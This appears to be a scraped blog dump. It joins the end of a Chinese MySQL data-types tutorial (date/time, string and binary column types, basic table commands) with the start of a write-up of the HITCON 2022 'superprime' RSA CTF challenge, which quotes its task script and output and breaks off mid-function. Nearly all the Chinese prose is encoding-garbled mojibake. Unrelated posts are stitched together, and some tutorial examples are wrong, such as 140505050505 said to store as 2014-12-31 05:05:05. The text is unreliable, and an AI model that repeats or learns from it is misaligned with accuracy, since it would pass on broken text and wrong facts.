DATETIME å€¼éƒ½ä¸º 2014-12-31 05ï¼š05ï¼š05ã€‚\nä»¥ â€˜YY-MM-DD HHï¼šMMï¼šSSâ€˜ æˆ–è€… â€˜YYMMDDHHMMSSâ€˜ å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸï¼Œåœ¨è¿™é‡Œ YY è¡¨ç¤ºä¸¤ä½çš„å¹´å€¼ã€‚ä¸å‰é¢ç›¸åŒï¼Œâ€™00ï½79â€™ èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º â€˜2000ï½2079â€™ï¼Œâ€™80ï½99â€™ èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º â€˜1980ï½1999â€™ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ â€˜14-12-31 05ï¼š05ï¼š05â€™ï¼Œæ’å…¥æ•°æ®åº“çš„ DATETIME ä¸º 2014-12-31 05ï¼š05ï¼š05ï¼›è¾“å…¥ 141231050505ï¼Œæ’å…¥æ•°æ®åº“çš„ DATETIME ä¸º 2014-12-31 05ï¼š05ï¼š05ã€‚\nä»¥ YYYYMMDDHHMMSS æˆ–è€… YYMMDDHHMMSS æ•°å­—æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸå’Œæ—¶é—´ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ 20141231050505ï¼Œæ’å…¥æ•°æ®åº“çš„ DATETIME ä¸º 2014-12-31 05ï¼š05ï¼š05ï¼›è¾“å…¥ 140505050505ï¼Œæ’å…¥æ•°æ®åº“çš„ DATETIME ä¸º 2014-12-31 05ï¼š05ï¼š05ã€‚\n\nMySQL å…è®¸â€œä¸ä¸¥æ ¼â€è¯­æ³•ï¼š ä»»ä½•æ ‡ç‚¹ç¬¦å·éƒ½å¯ç”¨ä½œæ—¥æœŸéƒ¨åˆ†æˆ–æ—¶é—´éƒ¨åˆ†ä¹‹é—´çš„é—´éš”ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™98-12-31 11ï¼š30ï¼š45â€™ã€â€™98.12.31 11+30+35â€™ã€â€™98/12/31 113045â€™ å’Œ â€˜98@12@31 11^30^45â€™ æ˜¯ç­‰ä»·çš„ï¼Œè¿™äº›å€¼éƒ½å¯ä»¥æ­£ç¡®åœ°æ’å…¥æ•°æ®åº“ã€‚\nTIMESTAMP ç±»å‹TIMESTAMP çš„æ˜¾ç¤ºæ ¼å¼ä¸ DATETIME ç›¸åŒï¼Œæ˜¾ç¤ºå®½åº¦å›ºå®šåœ¨ 19 ä¸ªå­—ç¬¦ï¼Œæ—¥æœŸæ ¼å¼ä¸º YYYY-MM-DD HHï¼šMMï¼šSSï¼Œåœ¨å­˜å‚¨æ—¶éœ€è¦ 4 ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯ TIMESTAMP åˆ—çš„å–å€¼èŒƒå›´å°äº DATETIME çš„å–å€¼èŒƒå›´ï¼Œä¸º â€˜1970-01-01 00ï¼š00ï¼š01â€™UTCï½â€™2038-01-19 03ï¼š14ï¼š07â€™UTCã€‚åœ¨æ’å…¥æ•°æ®æ—¶ï¼Œè¦ä¿è¯åœ¨åˆæ³•çš„å–å€¼èŒƒå›´å†…ã€‚\næç¤ºï¼š åè°ƒä¸–ç•Œæ—¶ï¼ˆè‹±ï¼šCoordinated Universal Timeï¼Œæ³•ï¼šTemps Universel CoordonnÃ©ï¼‰åˆç§°ä¸ºä¸–ç•Œç»Ÿä¸€æ—¶é—´ã€ä¸–ç•Œæ ‡å‡†æ—¶é—´ã€å›½é™…åè°ƒæ—¶é—´ã€‚è‹±æ–‡ï¼ˆCUTï¼‰å’Œæ³•æ–‡ï¼ˆTUCï¼‰çš„ç¼©å†™ä¸åŒï¼Œä½œä¸ºå¦¥åï¼Œç®€ç§° UTCã€‚\nTIMESTAMP ä¸ DATETIME é™¤äº†å­˜å‚¨å­—èŠ‚å’Œæ”¯æŒçš„èŒƒå›´ä¸åŒå¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªæœ€å¤§çš„åŒºåˆ«æ˜¯ï¼š\n\nDATETIME åœ¨å­˜å‚¨æ—¥æœŸæ•°æ®æ—¶ï¼ŒæŒ‰å®é™…è¾“å…¥çš„æ ¼å¼å­˜å‚¨ï¼Œå³è¾“å…¥ä»€ä¹ˆå°±å­˜å‚¨ä»€ä¹ˆï¼Œä¸æ—¶åŒºæ— å…³ï¼›\nè€Œ TIMESTAMP å€¼çš„å­˜å‚¨æ˜¯ä»¥ UTCï¼ˆä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼‰æ ¼å¼ä¿å­˜çš„ï¼Œå­˜å‚¨æ—¶å¯¹å½“å‰æ—¶åŒºè¿›è¡Œè½¬æ¢ï¼Œæ£€ç´¢æ—¶å†è½¬æ¢å›å½“å‰æ—¶åŒºã€‚å³æŸ¥è¯¢æ—¶ï¼Œæ ¹æ®å½“å‰æ—¶åŒºçš„ä¸åŒï¼Œæ˜¾ç¤ºçš„æ—¶é—´å€¼æ˜¯ä¸åŒçš„ã€‚\n\næç¤ºï¼š å¦‚æœä¸ºä¸€ä¸ª DATETIME æˆ– TIMESTAMP å¯¹è±¡åˆ†é…ä¸€ä¸ª DATE å€¼ï¼Œç»“æœå€¼çš„æ—¶é—´éƒ¨åˆ†è¢«è®¾ç½®ä¸º â€˜00ï¼š00ï¼š00â€™ï¼Œå› æ­¤ DATE å€¼æœªåŒ…å«æ—¶é—´ä¿¡æ¯ã€‚å¦‚æœä¸ºä¸€ä¸ª DATE å¯¹è±¡åˆ†é…ä¸€ä¸ª DATETIME æˆ– TIMESTAMP å€¼ï¼Œç»“æœå€¼çš„æ—¶é—´éƒ¨åˆ†è¢«åˆ é™¤ï¼Œå› æ­¤DATE å€¼æœªåŒ…å«æ—¶é—´ä¿¡æ¯ã€‚\n\n2.7.3 å­—ç¬¦ä¸²ç±»å‹å­—ç¬¦ä¸²ç±»å‹ç”¨æ¥å­˜å‚¨å­—ç¬¦ä¸²æ•°æ®ï¼Œè¿˜å¯ä»¥å­˜å‚¨å›¾ç‰‡å’Œå£°éŸ³çš„äºŒè¿›åˆ¶æ•°æ®ã€‚å­—ç¬¦ä¸²å¯ä»¥åŒºåˆ†æˆ–è€…ä¸åŒºåˆ†å¤§å°å†™çš„ä¸²æ¯”è¾ƒï¼Œè¿˜å¯ä»¥è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æŸ¥æ‰¾ã€‚\nMySQL ä¸­çš„å­—ç¬¦ä¸²ç±»å‹æœ‰ CHARã€VARCHARã€TINYTEXTã€TEXTã€MEDIUMTEXTã€LONGTEXTã€ENUMã€SET ç­‰ã€‚\nä¸‹è¡¨ä¸­åˆ—å‡ºäº† MySQL ä¸­çš„å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ‹¬å·ä¸­çš„ M è¡¨ç¤ºå¯ä»¥ä¸ºå…¶æŒ‡å®šé•¿åº¦ã€‚\n\nVARCHAR å’Œ TEXT ç±»å‹æ˜¯å˜é•¿ç±»å‹ï¼Œå…¶å­˜å‚¨éœ€æ±‚å–å†³äºåˆ—å€¼çš„å®é™…é•¿åº¦ï¼ˆåœ¨å‰é¢çš„è¡¨æ ¼ä¸­ç”¨ L è¡¨ç¤ºï¼‰ï¼Œè€Œä¸æ˜¯å–å†³äºç±»å‹çš„æœ€å¤§å¯èƒ½å°ºå¯¸ã€‚\nä¾‹å¦‚ï¼Œä¸€ä¸ª VARCHAR(10) åˆ—èƒ½ä¿å­˜ä¸€ä¸ªæœ€å¤§é•¿åº¦ä¸º 10 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå®é™…çš„å­˜å‚¨éœ€è¦å­—ç¬¦ä¸²çš„é•¿åº¦ L åŠ ä¸Šä¸€ä¸ªå­—èŠ‚ä»¥è®°å½•å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚å¯¹äºå­—ç¬¦ â€œabcdâ€ï¼ŒL æ˜¯ 4ï¼Œè€Œå­˜å‚¨è¦æ±‚ 5 ä¸ªå­—èŠ‚ã€‚\nCHAR å’Œ VARCHAR ç±»å‹CHAR(M) ä¸ºå›ºå®šé•¿åº¦å­—ç¬¦ä¸²ï¼Œåœ¨å®šä¹‰æ—¶æŒ‡å®šå­—ç¬¦ä¸²åˆ—é•¿ã€‚å½“ä¿å­˜æ—¶ï¼Œåœ¨å³ä¾§å¡«å……ç©ºæ ¼ä»¥è¾¾åˆ°æŒ‡å®šçš„é•¿åº¦ã€‚M è¡¨ç¤ºåˆ—çš„é•¿åº¦ï¼ŒèŒƒå›´æ˜¯ 0ï½255 ä¸ªå­—ç¬¦ã€‚\nä¾‹å¦‚ï¼ŒCHAR(4) å®šä¹‰äº†ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²åˆ—ï¼ŒåŒ…å«çš„å­—ç¬¦ä¸ªæ•°æœ€å¤§ä¸º 4ã€‚å½“æ£€ç´¢åˆ° CHAR å€¼æ—¶ï¼Œå°¾éƒ¨çš„ç©ºæ ¼å°†è¢«åˆ é™¤ã€‚\nVARCHAR(M) æ˜¯é•¿åº¦å¯å˜çš„å­—ç¬¦ä¸²ï¼ŒM è¡¨ç¤ºæœ€å¤§åˆ—çš„é•¿åº¦ï¼ŒM çš„èŒƒå›´æ˜¯ 0ï½65535ã€‚VARCHAR çš„æœ€å¤§å®é™…é•¿åº¦ç”±æœ€é•¿çš„è¡Œçš„å¤§å°å’Œä½¿ç”¨çš„å­—ç¬¦é›†ç¡®å®šï¼Œè€Œå®é™…å ç”¨çš„ç©ºé—´ä¸ºå­—ç¬¦ä¸²çš„å®é™…é•¿åº¦åŠ  1ã€‚\nä¾‹å¦‚ï¼ŒVARCHAR(50) å®šä¹‰äº†ä¸€ä¸ªæœ€å¤§é•¿åº¦ä¸º 50 çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ’å…¥çš„å­—ç¬¦ä¸²åªæœ‰ 10 ä¸ªå­—ç¬¦ï¼Œåˆ™å®é™…å­˜å‚¨çš„å­—ç¬¦ä¸²ä¸º 10 ä¸ªå­—ç¬¦å’Œä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸå­—ç¬¦ã€‚VARCHAR åœ¨å€¼ä¿å­˜å’Œæ£€ç´¢æ—¶å°¾éƒ¨çš„ç©ºæ ¼ä»ä¿ç•™ã€‚\nå®ä¾‹ï¼š ä¸‹é¢å°†ä¸åŒçš„å­—ç¬¦ä¸²ä¿å­˜åˆ° CHAR(4) å’Œ VARCHAR(4) åˆ—ï¼Œè¯´æ˜ CHAR å’Œ VARCHAR ä¹‹é—´çš„å·®åˆ«ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\nå¯¹æ¯”ç»“æœå¯ä»¥çœ‹åˆ°ï¼ŒCHAR(4) å®šä¹‰äº†å›ºå®šé•¿åº¦ä¸º 4 çš„åˆ—ï¼Œæ— è®ºå­˜å…¥çš„æ•°æ®é•¿åº¦ä¸ºå¤šå°‘ï¼Œæ‰€å ç”¨çš„ç©ºé—´å‡ä¸º 4 ä¸ªå­—èŠ‚ã€‚VARCHAR(4) å®šä¹‰çš„åˆ—æ‰€å çš„å­—èŠ‚æ•°ä¸ºå®é™…é•¿åº¦åŠ  1ã€‚\nTEXT ç±»å‹TEXT åˆ—ä¿å­˜éäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¦‚æ–‡ç« å†…å®¹ã€è¯„è®ºç­‰ã€‚å½“ä¿å­˜æˆ–æŸ¥è¯¢ TEXT åˆ—çš„å€¼æ—¶ï¼Œä¸åˆ é™¤å°¾éƒ¨ç©ºæ ¼ã€‚\nTEXT ç±»å‹åˆ†ä¸º 4 ç§ï¼šTINYTEXTã€TEXTã€MEDIUMTEXT å’Œ LONGTEXTã€‚ä¸åŒçš„ TEXT ç±»å‹çš„å­˜å‚¨ç©ºé—´å’Œæ•°æ®é•¿åº¦ä¸åŒã€‚\n\nTINYTEXT è¡¨ç¤ºé•¿åº¦ä¸º 255å­—ç¬¦çš„ TEXT åˆ—ã€‚\nTEXT è¡¨ç¤ºé•¿åº¦ä¸º 65535å­—ç¬¦çš„ TEXT åˆ—ã€‚\nMEDIUMTEXT è¡¨ç¤ºé•¿åº¦ä¸º 16777215å­—ç¬¦çš„ TEXT åˆ—ã€‚\nLONGTEXT è¡¨ç¤ºé•¿åº¦ä¸º 4294967295 æˆ– 4GB å­—ç¬¦çš„ TEXT åˆ—ã€‚\n\nENUM ç±»å‹ENUM æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œå€¼ä¸ºè¡¨åˆ›å»ºæ—¶åˆ—è§„å®šä¸­æšä¸¾çš„ä¸€åˆ—å€¼ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n&lt;å­—æ®µå&gt; ENUM( &#x27;å€¼1&#x27;, &#x27;å€¼1&#x27;, â€¦, &#x27;å€¼n&#x27; )\nå­—æ®µåæŒ‡å°†è¦å®šä¹‰çš„å­—æ®µï¼Œå€¼ n æŒ‡æšä¸¾åˆ—è¡¨ä¸­ç¬¬ n ä¸ªå€¼ã€‚\nENUM ç±»å‹çš„å­—æ®µåœ¨å–å€¼æ—¶ï¼Œèƒ½åœ¨æŒ‡å®šçš„æšä¸¾åˆ—è¡¨ä¸­è·å–ï¼Œè€Œä¸”ä¸€æ¬¡åªèƒ½å–ä¸€ä¸ªã€‚å¦‚æœåˆ›å»ºçš„æˆå‘˜ä¸­æœ‰ç©ºæ ¼ï¼Œå°¾éƒ¨çš„ç©ºæ ¼å°†è‡ªåŠ¨è¢«åˆ é™¤ã€‚\nENUM å€¼åœ¨å†…éƒ¨ç”¨æ•´æ•°è¡¨ç¤ºï¼Œæ¯ä¸ªæšä¸¾å€¼å‡æœ‰ä¸€ä¸ªç´¢å¼•å€¼ï¼›åˆ—è¡¨å€¼æ‰€å…è®¸çš„æˆå‘˜å€¼ä» 1 å¼€å§‹ç¼–å·ï¼ŒMySQL å­˜å‚¨çš„å°±æ˜¯è¿™ä¸ªç´¢å¼•ç¼–å·ï¼Œæšä¸¾æœ€å¤šå¯ä»¥æœ‰ 65535 ä¸ªå…ƒç´ ã€‚\nä¾‹å¦‚ï¼Œå®šä¹‰ ENUM ç±»å‹çš„åˆ—ï¼ˆâ€™firstâ€™ï¼Œâ€™secondâ€™ï¼Œâ€™thirdâ€™ï¼‰ï¼Œè¯¥åˆ—å¯ä»¥å–çš„å€¼å’Œæ¯ä¸ªå€¼çš„ç´¢å¼•å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\nENUM å€¼ä¾ç…§åˆ—ç´¢å¼•é¡ºåºæ’åˆ—ï¼Œå¹¶ä¸”ç©ºå­—ç¬¦ä¸²æ’åœ¨éç©ºå­—ç¬¦ä¸²å‰ï¼ŒNULL å€¼æ’åœ¨å…¶ä»–æ‰€æœ‰æšä¸¾å€¼å‰ã€‚\næç¤ºï¼š ENUM åˆ—æ€»æœ‰ä¸€ä¸ªé»˜è®¤å€¼ã€‚å¦‚æœå°† ENUM åˆ—å£°æ˜ä¸º NULLï¼ŒNULL å€¼åˆ™ä¸ºè¯¥åˆ—çš„ä¸€ä¸ªæœ‰æ•ˆå€¼ï¼Œå¹¶ä¸”é»˜è®¤å€¼ä¸º NULLã€‚å¦‚æœ ENUM åˆ—è¢«å£°æ˜ä¸º NOT NULLï¼Œå…¶é»˜è®¤å€¼ä¸ºå…è®¸çš„å€¼åˆ—è¡¨çš„ç¬¬ 1 ä¸ªå…ƒç´ ã€‚\nSET ç±»å‹SET æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¯¹è±¡ï¼Œå¯ä»¥æœ‰é›¶æˆ–å¤šä¸ªå€¼ï¼ŒSET åˆ—æœ€å¤šå¯ä»¥æœ‰ 64 ä¸ªæˆå‘˜ï¼Œå€¼ä¸ºè¡¨åˆ›å»ºæ—¶è§„å®šçš„ä¸€åˆ—å€¼ã€‚æŒ‡å®šåŒ…æ‹¬å¤šä¸ª SET æˆå‘˜çš„ SET åˆ—å€¼æ—¶ï¼Œå„æˆå‘˜ä¹‹é—´ç”¨é€—å·,éš”å¼€ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\nSET( &#x27;å€¼1&#x27;, &#x27;å€¼2&#x27;, â€¦, &#x27;å€¼n&#x27; )\nä¸ ENUM ç±»å‹ç›¸åŒï¼ŒSET å€¼åœ¨å†…éƒ¨ç”¨æ•´æ•°è¡¨ç¤ºï¼Œåˆ—è¡¨ä¸­æ¯ä¸ªå€¼éƒ½æœ‰ä¸€ä¸ªç´¢å¼•ç¼–å·ã€‚å½“åˆ›å»ºè¡¨æ—¶ï¼ŒSET æˆå‘˜å€¼çš„å°¾éƒ¨ç©ºæ ¼å°†è‡ªåŠ¨åˆ é™¤ã€‚\nä½†ä¸ ENUM ç±»å‹ä¸åŒçš„æ˜¯ï¼ŒENUM ç±»å‹çš„å­—æ®µåªèƒ½ä»å®šä¹‰çš„åˆ—å€¼ä¸­é€‰æ‹©ä¸€ä¸ªå€¼æ’å…¥ï¼Œè€Œ SET ç±»å‹çš„åˆ—å¯ä»å®šä¹‰çš„åˆ—å€¼ä¸­é€‰æ‹©å¤šä¸ªå­—ç¬¦çš„è”åˆã€‚\næç¤ºï¼š å¦‚æœæ’å…¥ SET å­—æ®µä¸­çš„åˆ—å€¼æœ‰é‡å¤ï¼Œåˆ™ MySQL è‡ªåŠ¨åˆ é™¤é‡å¤çš„å€¼ï¼›æ’å…¥ SET å­—æ®µçš„å€¼çš„é¡ºåºå¹¶ä¸é‡è¦ï¼ŒMySQL ä¼šåœ¨å­˜å…¥æ•°æ®åº“æ—¶ï¼ŒæŒ‰ç…§å®šä¹‰çš„é¡ºåºæ˜¾ç¤ºï¼›å¦‚æœæ’å…¥äº†ä¸æ­£ç¡®çš„å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQL å°†å¿½è§†è¿™äº›å€¼ï¼Œç»™å‡ºè­¦å‘Šã€‚\n\n2.7.4 äºŒè¿›åˆ¶ç±»å‹MySQL æ”¯æŒä¸¤ç±»å­—ç¬¦å‹æ•°æ®ï¼šæ–‡æœ¬å­—ç¬¦ä¸²å’ŒäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚äºŒè¿›åˆ¶å­—ç¬¦ä¸²ç±»å‹æœ‰æ—¶å€™ä¹Ÿç›´æ¥è¢«ç§°ä¸ºâ€œäºŒè¿›åˆ¶ç±»å‹â€ã€‚\nMySQL ä¸­çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²æœ‰ BITã€BINARYã€VARBINARYã€TINYBLOBã€BLOBã€MEDIUMBLOB å’Œ LONGBLOBã€‚\nä¸‹è¡¨ä¸­åˆ—å‡ºäº† MySQL ä¸­çš„äºŒè¿›åˆ¶æ•°æ®ç±»å‹ï¼Œæ‹¬å·ä¸­çš„ M è¡¨ç¤ºå¯ä»¥ä¸ºå…¶æŒ‡å®šé•¿åº¦ã€‚\n\nBIT ç±»å‹ä½å­—æ®µç±»å‹ã€‚M è¡¨ç¤ºæ¯ä¸ªå€¼çš„ä½æ•°ï¼ŒèŒƒå›´ä¸º 1ï½64ã€‚å¦‚æœ M è¢«çœç•¥ï¼Œé»˜è®¤å€¼ä¸º 1ã€‚å¦‚æœä¸º BIT(M) åˆ—åˆ†é…çš„å€¼çš„é•¿åº¦å°äº M ä½ï¼Œåœ¨å€¼çš„å·¦è¾¹ç”¨ 0 å¡«å……ã€‚ä¾‹å¦‚ï¼Œä¸º BIT(6) åˆ—åˆ†é…ä¸€ä¸ªå€¼ bâ€™101â€™ï¼Œå…¶æ•ˆæœä¸åˆ†é… bâ€™000101â€™ ç›¸åŒã€‚\nBIT æ•°æ®ç±»å‹ç”¨æ¥ä¿å­˜ä½å­—æ®µå€¼ï¼Œä¾‹å¦‚ä»¥äºŒè¿›åˆ¶çš„å½¢å¼ä¿å­˜æ•°æ® 13ï¼Œ13 çš„äºŒè¿›åˆ¶å½¢å¼ä¸º 1101ï¼Œåœ¨è¿™é‡Œéœ€è¦ä½æ•°è‡³å°‘ä¸º 4 ä½çš„ BIT ç±»å‹ï¼Œå³å¯ä»¥å®šä¹‰åˆ—ç±»å‹ä¸º BIT(4)ã€‚å¤§äºäºŒè¿›åˆ¶ 1111 çš„æ•°æ®æ˜¯ä¸èƒ½æ’å…¥BIT(4) ç±»å‹çš„å­—æ®µä¸­çš„ã€‚\næç¤ºï¼š é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQL ä¸å¯ä»¥æ’å…¥è¶…å‡ºè¯¥åˆ—å…è®¸èŒƒå›´çš„å€¼ï¼Œå› è€Œæ’å…¥æ•°æ®æ—¶è¦ç¡®ä¿æ’å…¥çš„å€¼åœ¨æŒ‡å®šçš„èŒƒå›´å†…ã€‚\nBINARY å’Œ VARBINARY ç±»å‹BINARY å’Œ VARBINARY ç±»å‹ç±»ä¼¼äº CHAR å’Œ VARCHARï¼Œä¸åŒçš„æ˜¯å®ƒä»¬åŒ…å«äºŒè¿›åˆ¶å­—èŠ‚å­—ç¬¦ä¸²ã€‚ä½¿ç”¨çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\nåˆ—åç§° BINARY(M) æˆ–è€… VARBINARY(M)\nBINARY ç±»å‹çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼ŒæŒ‡å®šé•¿åº¦åï¼Œä¸è¶³æœ€å¤§é•¿åº¦çš„ï¼Œå°†åœ¨å®ƒä»¬å³è¾¹å¡«å…… â€œ\\0â€ è¡¥é½ï¼Œä»¥è¾¾åˆ°æŒ‡å®šé•¿åº¦ã€‚ä¾‹å¦‚ï¼ŒæŒ‡å®šåˆ—æ•°æ®ç±»å‹ä¸º BINARY(3)ï¼Œå½“æ’å…¥ a æ—¶ï¼Œå­˜å‚¨çš„å†…å®¹å®é™…ä¸º â€œ\\a0\\0â€ï¼Œå½“æ’å…¥ ab æ—¶ï¼Œå®é™…å­˜å‚¨çš„å†…å®¹ä¸ºâ€œab\\0â€ï¼Œæ— è®ºå­˜å‚¨çš„å†…å®¹æ˜¯å¦è¾¾åˆ°æŒ‡å®šçš„é•¿åº¦ï¼Œå­˜å‚¨ç©ºé—´å‡ä¸ºæŒ‡å®šçš„å€¼ Mã€‚\nVARBINARY ç±»å‹çš„é•¿åº¦æ˜¯å¯å˜çš„ï¼ŒæŒ‡å®šå¥½é•¿åº¦ä¹‹åï¼Œé•¿åº¦å¯ä»¥åœ¨ 0 åˆ°æœ€å¤§å€¼ä¹‹é—´ã€‚ä¾‹å¦‚ï¼ŒæŒ‡å®šåˆ—æ•°æ®ç±»å‹ä¸º VARBINARY(20)ï¼Œå¦‚æœæ’å…¥çš„å€¼é•¿åº¦åªæœ‰ 10ï¼Œåˆ™å®é™…å­˜å‚¨ç©ºé—´ä¸º 10 åŠ  1ï¼Œå®é™…å ç”¨çš„ç©ºé—´ä¸ºå­—ç¬¦ä¸²çš„å®é™…é•¿åº¦åŠ  1ã€‚\nBLOB ç±»å‹BLOB æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å¯¹è±¡ï¼Œç”¨æ¥å­˜å‚¨å¯å˜æ•°é‡çš„æ•°æ®ã€‚BLOB ç±»å‹åˆ†ä¸º 4 ç§ï¼šTINYBLOBã€BLOBã€MEDIUMBLOB å’Œ LONGBLOBï¼Œå®ƒä»¬å¯å®¹çº³å€¼çš„æœ€å¤§é•¿åº¦ä¸åŒï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\n\nBLOB åˆ—å­˜å‚¨çš„æ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå­—èŠ‚å­—ç¬¦ä¸²ï¼‰ï¼ŒTEXT åˆ—å­˜å‚¨çš„æ˜¯éè¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦å­—ç¬¦ä¸²ï¼‰ã€‚\nBLOB åˆ—æ˜¯å­—ç¬¦é›†ï¼Œå¹¶ä¸”æ’åºå’Œæ¯”è¾ƒåŸºäºåˆ—å€¼å­—èŠ‚çš„æ•°å€¼ï¼›TEXT åˆ—æœ‰ä¸€ä¸ªå­—ç¬¦é›†ï¼Œå¹¶ä¸”æ ¹æ®å­—ç¬¦é›†å¯¹å€¼è¿›è¡Œæ’åºå’Œæ¯”è¾ƒã€‚\n\n\n2.7.5 Linkhttps://mp.weixin.qq.com/s?__biz=MzA5NzQxOTE4NA==&amp;mid=2247484005&amp;idx=1&amp;sn=9cfc06b6605cfc10056971a745e400e2&amp;chksm=90a068baa7d7e1ac5f14f0b42d54ebb8effc1b1e9bb6035f22ea1eb6d2ad2dcfd35fc6323e0b&amp;scene=27\n2.8 è¡¨çš„æ“ä½œéœ€è¦æ“ä½œæ•°æ®åº“ä¸­çš„è¡¨æ—¶ï¼Œéœ€è¦å…ˆä½¿ç”¨è¯¥æ•°æ®åº“\nuse db_test;\n2.8.1 æŸ¥çœ‹è¡¨ç»“æ„desc [name]\nè¡¨ç»“æ„çš„å…·ä½“è§£é‡Šï¼š\n\n2.8.2 åˆ›å»ºè¡¨create table table_name(datatype1,datatype2,...);\n2.8.3 åˆ é™¤è¡¨drop table table_name;\nè¯­æ³•ï¼š\nDROP [TEMPORARY] TABLE [IF EXISTS] tbl_name [, tbl_name] ...\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"superprime [HITCON 2022]","url":"/2023/03/22/superprime/","content":"superprime [HITCON2022]Analyzeå…ˆä¸Šé¢˜\ntask.py\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_longdef getSuperPrime(nbits):    while True:        p = getPrime(nbits)        pp = bytes_to_long(str(p).encode())        if isPrime(pp):            return p, ppp1, q1 = getSuperPrime(512)p2, q2 = getSuperPrime(512)p3, q3 = getSuperPrime(512)p4, q4 = getSuperPrime(512)p5, q5 = getSuperPrime(512)n1 = p1 * q1n2 = p2 * p3n3 = q2 * q3n4 = p4 * q5n5 = p5 * q4e = 65537c = bytes_to_long(open(\"flag.txt\", \"rb\").read().strip())for n in sorted([n1, n2, n3, n4, n5]):    c = pow(c, e, n)print(f\"{n1 = }\")print(f\"{n2 = }\")print(f\"{n3 = }\")print(f\"{n4 = }\")print(f\"{n5 = }\")print(f\"{e = }\")print(f\"{c = }\")\noutput.txt\nn1 = 132240475872174910020944408159013384770525986234801028624784519134365862704105251340824787510945183963356820885920367304711310957365047441178683686926111455575911962257698539064559510444855775549001648292058855493337857073693460061212792795075263084221929517773754699732129582794061997056827998985829666251060653380798686353779510948629280009197715644814616657550158740378670095210797455828266323922570838468050733341304227070902756780052159113811360169205531739117518635829837403006788948761106892086004133969899267757339921n2 = 95063555614573541810575593850289506856925979977609991181205616159125089261546784721154599484613262518469706157215924537125160406418217535531993036958388330505871763176297570429533467696205928686731756713059807727405313286020007347211892135226632724359291407913539632339885950358476265995466145680878334722001n3 = 59077122528757446350604269162079270359932342538938986760275099248290981958441838384256597839386787448447136083450980256330743221155636885358548541847176342745397373638152767362253944731433134474562146358334422503033973244936835557423934491676324297243326613498319086748647812745223753746779568080090592100960499863677438403657325762852705171109382084916335379889394829715777901290096314487661584614712488781379507151355301063123233880909931925363322846957197537676660047824476129446066149857051131731840540157488590899311381370266592295206055792990886734933291304077440476730373491475852882163732120626849448728573574411786320772125534383707413572678316508826450778346723441956945169297689138799298561759843280317867927205551400065163199599457n4 = 24589423756497058585126900932611669798817346035509889383925628660158156567930038333401661451846451875869437263666365776498658699865323180836374906288949824205543130261556051807217164348291174483234810669420041361857307271050079366739157441129916338485838528114129985080841445467007786565727910355311119650431197742495274527401569906785121880408809802492383216836691265423297722021017515667257863302820657924121913047547741420413553737917632809270380269758313556777803344394624408862183672919570479289614998783678080936272369083n5 = 185885020243714550225131939334004568560534422416697599024696590344782893162219788079305752632863387855011040772104676488940707663157284194641170875157382507202789029285286466326803699701161968587945867047101502048926016515139728368809523009828247173096909917611001113266938209226483162533302629909322412013492978440863258135181226831155024690292336026753678424906151360739424148666951389956182136072508650529271179749569637083537783283360860102371562796635391549934474381821125255176073752645643893294533330184238070085333427e = 65537c = 44836759088389215801662306050375432910426695023654894661152471598197009644316944364461563733708795401026569460109604554622161444073404474265330567406370705019579756826106816505952084633979876247266812002057927154389274998399825703196810049647324831928277737068842860115202258059693760003397831075633707611377854322143735834890385706873765241863615950449707047454133596389612468366465634011925228326638487664313491916754929381088396403448356901628825906815317934440495749705736715790281606858736722493438754469493049523175471903946974639097168758949520143915621139415847104585816466890751841858540120267543411140490236193353524030168152197407408753865346510476692347085048554088639428645948051171829012753631844379643600528027854258899402371612\nPhase 1é¦–å…ˆè§‚å¯Ÿä¸€ä¸‹å‡½æ•°getSuperPrime(nbits)ï¼Œå…¶é¦–å…ˆç”Ÿæˆä¸€ä¸ªnbitsä½çš„ç´ æ•°pï¼Œå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²åç”¨å‡½æ•°bytes_to_long()å†æ¬¡è½¬æ¢ï¼Œå¾ªç¯ç›´åˆ°ç»“æœä¸ºç´ æ•°ppä¸ºæ­¢ï¼Œè¿”å›å€¼ä¸ºpï¼Œppï¼ŒæŸ¥çœ‹ä¸€ä¸‹bytes_to_long()çš„æºç ï¼š\ndef bytes_to_long(s):    \"\"\"Convert a byte string to a long integer (big endian).    In Python 3.2+, use the native method instead::        &gt;&gt;&gt; int.from_bytes(s, 'big')    For instance::        &gt;&gt;&gt; int.from_bytes(b'\\x00P', 'big')        80    This is (essentially) the inverse of :func:`long_to_bytes`.    \"\"\"    acc 